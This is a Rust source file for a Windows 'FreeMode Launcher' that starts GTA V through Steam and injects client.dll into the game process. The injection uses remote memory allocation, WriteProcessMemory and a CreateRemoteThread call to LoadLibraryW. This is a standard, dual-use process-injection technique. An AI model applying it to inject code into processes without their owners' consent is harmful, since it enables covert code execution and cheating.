#![cfg(windows)]

use std::env;
use std::ffi::c_void;
use std::path::PathBuf;
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;
use sysinfo::System;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

use windows::core::{PCWSTR, w};
use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE, VirtualAllocEx, VirtualFreeEx,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS, WaitForSingleObject, INFINITE, GetExitCodeThread
};
use windows::Win32::UI::Shell::ShellExecuteW;
use windows::Win32::UI::WindowsAndMessaging::SW_SHOW;

fn main() {
    println!("FreeMode Launcher");

    // Start Steam and Launch GTA V
    println!("Launching GTA V via Steam...");
    unsafe {
        ShellExecuteW(
            None,
            w!("open"),
            w!("steam://run/271590"),
            None,
            None,
            SW_SHOW,
        );
    }

    println!("Waiting for GTA5.exe to start...");
    let mut sys = System::new_all();
    let pid = loop {
        sys.refresh_processes();
        if let Some((pid, _)) = sys.processes().iter().find(|(_, p)| p.name() == "GTA5.exe") {
            break pid.as_u32();
        }
        thread::sleep(Duration::from_millis(500));
    };

    println!("Found GTA5.exe with PID: {}", pid);
    
    // Give the process a moment to initialize
    thread::sleep(Duration::from_secs(5));

    let mut current_dir = env::current_dir().expect("Failed to get current directory");
    current_dir.push("client.dll");
    
    if !current_dir.exists() {
        println!("Error: client.dll not found at {:?}", current_dir);
        // Fallback: check if we are running via cargo run and try target/x86_64-pc-windows-msvc/debug/client.dll
        current_dir = env::current_dir().unwrap();
        current_dir.push("target");
        current_dir.push("x86_64-pc-windows-msvc");
        current_dir.push("debug");
        current_dir.push("client.dll");
        if !current_dir.exists() {
            println!("Error: client.dll not found. Please place it in the same directory as the launcher.");
            return;
        }
    }

    let dll_path = current_dir.to_str().unwrap();
    println!("Injecting: {}", dll_path);

    if inject_dll(pid, dll_path) {
        println!("Successfully injected!");
    } else {
        println!("Injection failed.");
    }
}

fn inject_dll(pid: u32, dll_path: &str) -> bool {
    unsafe {
        // Open the target process
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap_or_default();
        if process_handle.is_invalid() {
            println!("Failed to open process. Are you running as administrator?");
            return false;
        }

        // Allocate memory for the DLL path in the target process (UTF-16)
        let wide_path: Vec<u16> = OsStr::new(dll_path).encode_wide().chain(std::iter::once(0)).collect();
        let path_len = wide_path.len() * 2;
        let remote_mem = VirtualAllocEx(
            process_handle,
            None,
            path_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            println!("Failed to allocate memory in target process.");
            CloseHandle(process_handle).ok();
            return false;
        }

        // Write the DLL path into the allocated memory
        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_handle,
            remote_mem,
            wide_path.as_ptr() as *const c_void,
            path_len,
            Some(&mut bytes_written),
        );

        if write_result.is_err() {
            println!("Failed to write to process memory.");
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE).ok();
            CloseHandle(process_handle).ok();
            return false;
        }

        // Get the address of LoadLibraryA from kernel32.dll
        let kernel32 = GetModuleHandleW(w!("kernel32.dll")).unwrap_or_default();
        if kernel32.is_invalid() {
            println!("Failed to get handle to kernel32.dll.");
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE).ok();
            CloseHandle(process_handle).ok();
            return false;
        }

        let load_library_addr = GetProcAddress(kernel32, windows::core::s!("LoadLibraryW"));
        if load_library_addr.is_none() {
            println!("Failed to find LoadLibraryW.");
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE).ok();
            CloseHandle(process_handle).ok();
            return false;
        }

        // Create a remote thread that executes LoadLibraryW with the address of our allocated memory
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(std::mem::transmute(load_library_addr)),
            Some(remote_mem),
            0,
            None,
        ).unwrap_or_default();

        if thread_handle.is_invalid() {
            println!("Failed to create remote thread.");
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE).ok();
            CloseHandle(process_handle).ok();
            return false;
        }

        // Wait for the thread to finish
        WaitForSingleObject(thread_handle, INFINITE);

        let mut exit_code = 0;
        GetExitCodeThread(thread_handle, &mut exit_code).ok();

        // Cleanup
        CloseHandle(thread_handle).ok();
        VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE).ok();
        CloseHandle(process_handle).ok();

        if exit_code == 0 {
            println!("LoadLibraryW failed inside the target process. Exit code: {}", exit_code);
            return false;
        }

        true
    }
}
